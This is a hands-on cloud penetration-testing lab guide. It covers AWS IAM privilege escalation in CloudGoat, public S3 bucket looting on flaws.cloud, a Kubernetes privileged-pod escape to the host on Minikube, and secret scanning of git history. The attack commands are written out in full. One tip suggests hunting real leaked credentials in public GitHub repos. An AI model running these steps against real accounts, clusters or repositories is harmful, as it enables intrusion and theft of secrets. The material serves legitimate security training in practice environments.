# 06 — Cloud Security: Labs

> 📋 **What You Will Do In This Section**
> - [ ] Deploy and exploit vulnerable AWS environments with CloudGoat
> - [ ] Hunt for public S3 buckets using naming patterns
> - [ ] Attack a local Kubernetes cluster (Minikube) with RBAC exploits
> - [ ] Scan repositories for leaked secrets with trufflehog/gitleaks
> - [ ] Complete the flaws.cloud AWS security challenge

---

## 🧪 Lab 1: AWS IAM Enumeration (CloudGoat)

### Objective
Deploy a vulnerable AWS environment and escalate from limited IAM user to admin.

> 💡 **Why This Matters**
> CloudGoat by Rhino Security Labs creates real AWS infrastructure with intentional misconfigurations. This is the closest you'll get to a real AWS pentest without an actual engagement. Each scenario teaches a specific privilege escalation technique.

### Setup
```bash
# Install CloudGoat
pip3 install cloudgoat

# Configure (requires AWS account with admin access)
cloudgoat config profile
# Enter your AWS profile name

# Deploy the vulnerable scenario
cloudgoat create iam_privesc_by_rollback
```

### Exercise

**Step 1: Identify yourself**
```bash
# Use the credentials CloudGoat provides
export AWS_ACCESS_KEY_ID=<provided_key>
export AWS_SECRET_ACCESS_KEY=<provided_secret>
aws sts get-caller-identity
```

> ✅ **Expected Output**
> ```json
> {
>     "UserId": "AIDAXXXXXXXXX",
>     "Account": "123456789012",
>     "Arn": "arn:aws:iam::123456789012:user/raynor"
> }
> ```

**Step 2: Enumerate what you can do**
```bash
aws iam list-attached-user-policies --user-name raynor
aws iam list-policy-versions --policy-arn <policy_arn>
```

**Step 3: Find a more permissive policy version**
```bash
# List all versions of the attached policy
aws iam list-policy-versions --policy-arn <policy_arn>
# Look for older versions with more permissions

# Get the policy document for each version
aws iam get-policy-version --policy-arn <policy_arn> --version-id v1
```

> ✅ **Expected Output**
> An older policy version with `"Action": "*"` — full admin access!

**Step 4: Activate the permissive version**
```bash
aws iam set-default-policy-version --policy-arn <policy_arn> --version-id v1
aws iam list-users  # Should now work!
```

**Cleanup**
```bash
cloudgoat destroy iam_privesc_by_rollback
```

> 🔧 **If Stuck**
> - CloudGoat fails to deploy → Check your AWS credentials have admin permissions
> - Policy version denied → You might need `iam:SetDefaultPolicyVersion` permission (that's the point of this scenario)
> - Clean up costs → CloudGoat uses minimal resources, but always destroy after testing

### ✅ Success Criteria
- [ ] CloudGoat scenario deployed
- [ ] Identified starting permissions
- [ ] Found permissive policy version
- [ ] Escalated to admin
- [ ] Cleaned up resources

---

## 🧪 Lab 2: S3 Bucket Hunting

### Objective
Discover and exploit misconfigured S3 buckets.

> 💡 **Why This Matters**
> S3 bucket misconfiguration is still one of the most common cloud findings. Companies create buckets like `company-backup` or `company-dev` and forget to restrict access. A single public bucket can contain database dumps, credentials, and customer data.

### Exercise — flaws.cloud Challenge

```bash
# flaws.cloud is an AWS security challenge designed by AWS hero Scott Piper
# Start at: http://flaws.cloud/

# Level 1: Find the S3 bucket
aws s3 ls s3://flaws.cloud --no-sign-request
```

> ✅ **Expected Output**
> ```
> 2017-03-13 23:00:38       2575 hint1.html
> 2017-03-02 23:05:17       1707 hint2.html
> 2017-03-02 23:05:11       1101 hint3.html
> 2020-05-22 18:16:45       3082 index.html
> ... (more files)
> ```
> The bucket is publicly accessible! Download and read files to progress.

```bash
# Download everything from the public bucket
aws s3 sync s3://flaws.cloud ./flaws-loot --no-sign-request

# Look for sensitive files
grep -rn "secret\|key\|password\|flag" ./flaws-loot/
```

> 🔧 **If Stuck**
> - `aws s3 ls` fails → Make sure you use `--no-sign-request` for unauthenticated access
> - Can't proceed to Level 2 → Read the HTML files you downloaded for hints
> - Want more: Try flaws2.cloud for the attacker AND defender perspective

### ✅ Success Criteria
- [ ] Listed public S3 bucket contents
- [ ] Downloaded files from the bucket
- [ ] Completed at least Level 1 of flaws.cloud

---

## 🧪 Lab 3: Kubernetes Cluster Attack (Minikube)

### Objective
Set up a local Kubernetes cluster and practice RBAC exploitation and pod escape.

> 💡 **Why This Matters**
> Most companies running Kubernetes have at least one namespace with overly permissive service accounts. This lab teaches you to identify and exploit those misconfigurations — the same techniques work on production clusters.

### Setup
```bash
# Install and start Minikube
minikube start

# Deploy a web application
kubectl create deployment web --image=nginx
kubectl expose deployment web --port=80 --type=NodePort

# Create an overly permissive service account (intentionally vulnerable)
kubectl create serviceaccount overprivileged
kubectl create clusterrolebinding overprivileged-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=default:overprivileged
```

### Exercise

**Step 1: Check your permissions**
```bash
kubectl auth can-i --list
echo ""
echo "=== Can we read secrets? ==="
kubectl auth can-i get secrets --all-namespaces
echo ""
echo "=== Can we create privileged pods? ==="
kubectl auth can-i create pods
```

**Step 2: Read all secrets**
```bash
kubectl get secrets --all-namespaces
kubectl get secret -o json | jq -r '.items[] | .metadata.name + ": " + (.data | keys | join(", "))'
```

> ✅ **Expected Output**
> A list of all secrets in the cluster, including service account tokens, TLS certificates, and any application secrets.

**Step 3: Create a privileged pod to escape to the host**
```bash
cat << 'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: exploit
    image: ubuntu
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  hostPID: true
EOF

# Wait for pod to start
kubectl wait --for=condition=Ready pod/escape-pod --timeout=60s

# Escape to host
kubectl exec -it escape-pod -- chroot /host /bin/bash
whoami  # root on the Minikube node!
```

**Cleanup**
```bash
kubectl delete pod escape-pod
kubectl delete clusterrolebinding overprivileged-binding
kubectl delete serviceaccount overprivileged
minikube delete
```

> 🔧 **If Stuck**
> - Minikube won't start → Ensure Docker is running. Try `minikube start --driver=docker`
> - Pod stuck in Pending → Check: `kubectl describe pod escape-pod` for events
> - chroot fails → The host filesystem is mounted at `/host`. Verify: `ls /host/etc/hostname`

### ✅ Success Criteria
- [ ] Local cluster running
- [ ] Overprivileged service account identified
- [ ] Secrets enumerated
- [ ] Escaped to host node via privileged pod
- [ ] Cleaned up all resources

---

## 🧪 Lab 4: CI/CD Secret Scanning

### Objective
Scan repositories for leaked secrets and understand the risk.

> 💡 **Why This Matters**
> Developers accidentally commit API keys, database passwords, and cloud credentials to Git every day. Even if they delete the secrets in a later commit, the old commit still contains them. Secret scanning is a high-value, low-effort technique that bug bounty hunters and pentesters use daily.

### Exercise

```bash
# Method 1: trufflehog (recommended)
# Install
pip3 install trufflehog

# Scan a repository
trufflehog git https://github.com/techgaun/github-dorks.git 2>/dev/null | head -30

# Scan your own repos
trufflehog filesystem /path/to/your/code

# Only show verified (working) secrets
trufflehog git https://github.com/your-org/repo.git --only-verified
```

```bash
# Method 2: gitleaks
go install github.com/gitleaks/gitleaks/v8@latest

# Scan repo
gitleaks detect --source=/path/to/repo -v

# Generate JSON report
gitleaks detect --source=/path/to/repo -f json -r secrets-report.json
```

```bash
# Method 3: Manual git history search
cd /path/to/any/repo
git log --all -p | grep -iE "password|secret|api_key|aws_access|token" | head -20
```

> ✅ **Expected Output**
> Secrets found in the repository — API keys, passwords, tokens in commit history.

> 🔧 **If Stuck**
> - No secrets found → Try a repo known to have leaks (e.g., create a test repo, commit a fake key, scan it)
> - trufflehog too slow → Use `--max-depth=50` to limit commit history depth
> - Want real practice → Search GitHub for `password` or `api_key` in `.env` files (many public repos have leaks)

### ✅ Success Criteria
- [ ] trufflehog or gitleaks installed
- [ ] At least one repository scanned
- [ ] Understood how to find secrets in git history

---

## 🧪 Lab 5: Recommended Platforms

> 💡 **Why This Matters**
> These platforms provide safe, legal environments to practice cloud attacks at increasing difficulty levels.

| Platform | URL | Focus | Difficulty |
|----------|-----|-------|-----------|
| flAWS | flaws.cloud | AWS misconfigurations | Beginner |
| flAWS2 | flaws2.cloud | AWS attack + defense | Intermediate |
| CloudGoat | github.com/RhinoSecurityLabs/cloudgoat | AWS exploitation | Intermediate |
| Kubernetes Goat | madhuakula.com/kubernetes-goat | K8s exploitation | Intermediate |
| CI/CDon't | cidont.com | CI/CD security | Intermediate |
| Thunder CTF | thunder-ctf.cloud | GCP security | Intermediate |

### Approach for Each Platform
```
1. Start with the easiest scenario
2. Try to solve without hints first (30 min)
3. If stuck, read the first hint only
4. Document your solution with exact commands
5. Understand the remediation (how to fix it)
```

---

## 📋 Lab Completion Checklist

- [ ] Lab 1: CloudGoat IAM privesc completed
- [ ] Lab 2: S3 bucket hunting (flaws.cloud Level 1+)
- [ ] Lab 3: K8s RBAC exploit + pod escape (Minikube)
- [ ] Lab 4: Secret scanning with trufflehog/gitleaks
- [ ] Lab 5: At least one platform challenge completed

---

## 🧠 If You're Stuck

1. **CloudGoat deploy fails**: Ensure your AWS profile has admin access. Check: `aws sts get-caller-identity`
2. **Minikube issues**: Try `minikube delete && minikube start --driver=docker`
3. **No secrets found by scanners**: Create a test repo, commit a fake `AWS_SECRET_ACCESS_KEY=AKIA...`, then scan it
4. **K8s commands failing**: Ensure kubeconfig is set: `export KUBECONFIG=~/.kube/config`
5. **flaws.cloud stuck**: Each level has HTML hint files. Download and read them.
